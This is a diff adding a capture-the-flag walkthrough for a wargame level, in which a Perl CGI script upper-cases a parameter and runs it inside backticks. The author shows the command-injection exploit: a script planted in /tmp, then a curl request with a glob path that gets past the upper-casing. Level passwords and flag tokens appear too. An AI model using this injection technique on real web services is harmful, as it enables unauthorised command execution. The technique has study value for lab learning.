@@ -1,0 +1,23 @@
+fa6v5ateaw21peobuub8ipe6s
+
+<- ls -l level12.pl && cat level12.pl
+
+It remind a bit of level04.
+
+-> n(t(param("x"), param("y")));
+Like before the x variable is used,
+
+-> $xx =~ tr/a-z/A-Z/;
+but there his content is upper-cased so won't be able to do a simple echo.
+
+-> @output = `egrep "^$xx" /tmp/xd 2>&1`;
+Next it execute the content of the file between ``
+Here we can execute our getflag:
+
+<- echo "echo \`getflag\` > /tmp/POPIPO" > /tmp/POPIPO && chmod 777 /tmp/POPIPO
+
+<- curl localhost:4646?x='`/*/POPIPO`'
+We use "/*/", because of the upper-cased string, /tmp/ will become /TMP/.
+
+<- cat /tmp/POPIPO
+-> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
